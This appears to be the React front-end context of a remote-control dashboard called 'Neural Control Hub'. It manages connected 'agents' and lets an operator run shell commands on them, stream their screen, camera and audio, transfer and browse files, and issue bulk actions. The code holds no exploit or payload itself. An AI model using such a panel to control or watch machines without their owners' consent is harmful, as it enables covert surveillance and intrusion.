import React, { createContext, useContext, useEffect, useState, useCallback } from 'react';
import { apiClient, Agent, SystemStats, ActivityEvent } from '../services/api';
import { wsClient, WebSocketEvents } from '../services/websocket';

interface SocketContextType {
  // Connection status
  connected: boolean;
  authenticated: boolean;
  
  // Data
  agents: Agent[];
  selectedAgent: string | null;
  systemStats: SystemStats | null;
  activities: ActivityEvent[];
  
  // Actions
  setSelectedAgent: (agentId: string | null) => void;
  login: (password: string) => Promise<boolean>;
  logout: () => Promise<void>;
  
  // Agent operations
  sendCommand: (agentId: string, command: string) => Promise<void>;
  startStream: (agentId: string, type: 'screen' | 'camera' | 'audio', quality?: string) => Promise<void>;
  stopStream: (agentId: string, type: 'screen' | 'camera' | 'audio') => Promise<void>;
  uploadFile: (agentId: string, file: File) => Promise<void>;
  downloadFile: (agentId: string, filePath: string) => Promise<void>;
  browseFiles: (agentId: string, path?: string) => Promise<any>;
  
  // System operations
  refreshAgents: () => Promise<void>;
  refreshSystemStats: () => Promise<void>;
  refreshActivities: (type?: string) => Promise<void>;
  executeBulkAction: (action: string, agentIds?: string[]) => Promise<void>;
  
  // Command output
  commandOutput: string[];
  addCommandOutput: (output: string) => void;
  clearCommandOutput: () => void;
}

const SocketContext = createContext<SocketContextType | null>(null);

export function SocketProvider({ children }: { children: React.ReactNode }) {
  // State
  const [connected, setConnected] = useState(false);
  const [authenticated, setAuthenticated] = useState(false);
  const [agents, setAgents] = useState<Agent[]>([]);
  const [selectedAgent, setSelectedAgent] = useState<string | null>(null);
  const [systemStats, setSystemStats] = useState<SystemStats | null>(null);
  const [activities, setActivities] = useState<ActivityEvent[]>([]);
  const [commandOutput, setCommandOutput] = useState<string[]>([]);

  // Command output management
  const addCommandOutput = useCallback((output: string) => {
    setCommandOutput(prev => [...prev.slice(-99), output]); // Keep last 100 lines
  }, []);

  const clearCommandOutput = useCallback(() => {
    setCommandOutput([]);
  }, []);

  // Authentication
  const login = useCallback(async (password: string): Promise<boolean> => {
    try {
      const response = await apiClient.login(password);
      if (response.success) {
        setAuthenticated(true);
        // Connect WebSocket after successful login
        await wsClient.connect();
        return true;
      }
      return false;
    } catch (error) {
      console.error('Login failed:', error);
      return false;
    }
  }, []);

  const logout = useCallback(async (): Promise<void> => {
    try {
      await apiClient.logout();
      wsClient.disconnect();
      setAuthenticated(false);
      setConnected(false);
      setAgents([]);
      setSystemStats(null);
      setActivities([]);
      clearCommandOutput();
    } catch (error) {
      console.error('Logout failed:', error);
    }
  }, [clearCommandOutput]);

  // Data fetching
  const refreshAgents = useCallback(async () => {
    try {
      const response = await apiClient.getAgents();
      if (response.success && response.data) {
        setAgents(response.data.agents);
      }
    } catch (error) {
      console.error('Failed to refresh agents:', error);
    }
  }, []);

  const refreshSystemStats = useCallback(async () => {
    try {
      const response = await apiClient.getSystemStats();
      if (response.success && response.data) {
        setSystemStats(response.data);
      }
    } catch (error) {
      console.error('Failed to refresh system stats:', error);
    }
  }, []);

  const refreshActivities = useCallback(async (type: string = 'all') => {
    try {
      const response = await apiClient.getActivity(type);
      if (response.success && response.data) {
        setActivities(response.data.activities);
      }
    } catch (error) {
      console.error('Failed to refresh activities:', error);
    }
  }, []);

  // Agent operations
  const sendCommand = useCallback(async (agentId: string, command: string): Promise<void> => {
    try {
      const response = await apiClient.executeCommand(agentId, command);
      if (response.success) {
        addCommandOutput(`> ${command}`);
      } else {
        addCommandOutput(`Error: ${response.error}`);
      }
    } catch (error) {
      console.error('Command execution failed:', error);
      addCommandOutput(`Error: ${error}`);
    }
  }, [addCommandOutput]);

  const startStream = useCallback(async (
    agentId: string, 
    type: 'screen' | 'camera' | 'audio', 
    quality: string = 'high'
  ): Promise<void> => {
    try {
      const response = await apiClient.startStream(agentId, type, quality);
      if (response.success) {
        addCommandOutput(`Starting ${type} stream for ${agentId}`);
      } else {
        addCommandOutput(`Error starting stream: ${response.error}`);
      }
    } catch (error) {
      console.error('Failed to start stream:', error);
      addCommandOutput(`Error starting stream: ${error}`);
    }
  }, [addCommandOutput]);

  const stopStream = useCallback(async (
    agentId: string, 
    type: 'screen' | 'camera' | 'audio'
  ): Promise<void> => {
    try {
      const response = await apiClient.stopStream(agentId, type);
      if (response.success) {
        addCommandOutput(`Stopping ${type} stream for ${agentId}`);
      } else {
        addCommandOutput(`Error stopping stream: ${response.error}`);
      }
    } catch (error) {
      console.error('Failed to stop stream:', error);
      addCommandOutput(`Error stopping stream: ${error}`);
    }
  }, [addCommandOutput]);

  const uploadFile = useCallback(async (agentId: string, file: File): Promise<void> => {
    try {
      const response = await apiClient.uploadFile(agentId, file);
      if (response.success) {
        addCommandOutput(`Uploading ${file.name} to ${agentId}`);
      } else {
        addCommandOutput(`Error uploading file: ${response.error}`);
      }
    } catch (error) {
      console.error('File upload failed:', error);
      addCommandOutput(`Error uploading file: ${error}`);
    }
  }, [addCommandOutput]);

  const downloadFile = useCallback(async (agentId: string, filePath: string): Promise<void> => {
    try {
      const response = await apiClient.downloadFile(agentId, filePath);
      if (response.success) {
        addCommandOutput(`Downloading ${filePath} from ${agentId}`);
      } else {
        addCommandOutput(`Error downloading file: ${response.error}`);
      }
    } catch (error) {
      console.error('File download failed:', error);
      addCommandOutput(`Error downloading file: ${error}`);
    }
  }, [addCommandOutput]);

  const browseFiles = useCallback(async (agentId: string, path: string = '/'): Promise<any> => {
    try {
      const response = await apiClient.browseFiles(agentId, path);
      return response.data;
    } catch (error) {
      console.error('File browsing failed:', error);
      return null;
    }
  }, []);

  const executeBulkAction = useCallback(async (action: string, agentIds: string[] = []): Promise<void> => {
    try {
      const response = await apiClient.executeBulkAction(action, agentIds);
      if (response.success) {
        addCommandOutput(`Bulk action "${action}" executed on ${response.data?.total_agents || 0} agents`);
      } else {
        addCommandOutput(`Error executing bulk action: ${response.error}`);
      }
    } catch (error) {
      console.error('Bulk action failed:', error);
      addCommandOutput(`Error executing bulk action: ${error}`);
    }
  }, [addCommandOutput]);

  // WebSocket event handlers
  useEffect(() => {
    if (!authenticated) return;

    // Connection events
    wsClient.on('connect', () => {
      setConnected(true);
      console.log('✅ Connected to Neural Control Hub');
      // Refresh data after connection
      refreshAgents();
      refreshSystemStats();
      refreshActivities();
    });

    wsClient.on('disconnect', () => {
      setConnected(false);
      console.log('❌ Disconnected from Neural Control Hub');
    });

    // Agent events
    wsClient.on('agent_list_update', (agentData) => {
      const agentList = Object.entries(agentData).map(([id, data]: [string, any]) => ({
        id,
        name: data.name || `Agent-${id.slice(0, 8)}`,
        status: data.sid ? 'online' : 'offline',
        platform: data.platform || 'Unknown',
        ip: data.ip || '127.0.0.1',
        last_seen: data.last_seen,
        capabilities: data.capabilities || ['screen', 'commands'],
        performance: {
          cpu: data.cpu_usage || 0,
          memory: data.memory_usage || 0,
          network: data.network_usage || 0
        }
      })) as Agent[];
      setAgents(agentList);
    });

    wsClient.on('agent_performance_update', (data) => {
      setAgents(prev => prev.map(agent => 
        agent.id === data.agent_id 
          ? { ...agent, performance: data.performance }
          : agent
      ));
    });

    // Command events
    wsClient.on('command_result', (data) => {
      addCommandOutput(`[${data.agent_id}] ${data.output}`);
    });

    // Stream events
    wsClient.on('stream_status_update', (data) => {
      addCommandOutput(`[${data.agent_id}] ${data.stream_type} stream ${data.status}`);
    });

    // File operation events
    wsClient.on('file_operation_result', (data) => {
      const status = data.success ? 'completed' : 'failed';
      addCommandOutput(`[${data.agent_id}] File ${data.operation} ${status}: ${data.file_path}`);
    });

    // System events
    wsClient.on('system_alert', (data) => {
      addCommandOutput(`[SYSTEM] ${data.type.toUpperCase()}: ${data.message}`);
    });

    // Activity events
    wsClient.on('activity_update', (data) => {
      setActivities(prev => [data, ...prev.slice(0, 49)]); // Keep last 50 activities
    });

    return () => {
      // Cleanup event listeners
      wsClient.off('connect', () => {});
      wsClient.off('disconnect', () => {});
      wsClient.off('agent_list_update', () => {});
      wsClient.off('agent_performance_update', () => {});
      wsClient.off('command_result', () => {});
      wsClient.off('stream_status_update', () => {});
      wsClient.off('file_operation_result', () => {});
      wsClient.off('system_alert', () => {});
      wsClient.off('activity_update', () => {});
    };
  }, [authenticated, refreshAgents, refreshSystemStats, refreshActivities, addCommandOutput]);

  // Check authentication status on mount
  useEffect(() => {
    const checkAuth = async () => {
      try {
        const response = await apiClient.checkAuthStatus();
        if (response.success && response.data?.authenticated) {
          setAuthenticated(true);
          await wsClient.connect();
        }
      } catch (error) {
        console.error('Auth check failed:', error);
      }
    };
    
    checkAuth();
  }, []);

  // Periodic data refresh
  useEffect(() => {
    if (!authenticated || !connected) return;

    const interval = setInterval(() => {
      refreshSystemStats();
    }, 30000); // Refresh every 30 seconds

    return () => clearInterval(interval);
  }, [authenticated, connected, refreshSystemStats]);

  const value: SocketContextType = {
    connected,
    authenticated,
    agents,
    selectedAgent,
    systemStats,
    activities,
    setSelectedAgent,
    login,
    logout,
    sendCommand,
    startStream,
    stopStream,
    uploadFile,
    downloadFile,
    browseFiles,
    refreshAgents,
    refreshSystemStats,
    refreshActivities,
    executeBulkAction,
    commandOutput,
    addCommandOutput,
    clearCommandOutput,
  };

  return (
    <SocketContext.Provider value={value}>
      {children}
    </SocketContext.Provider>
  );
}

export function useSocket() {
  const context = useContext(SocketContext);
  if (!context) {
    throw new Error('useSocket must be used within a SocketProvider');
  }
  return context;
}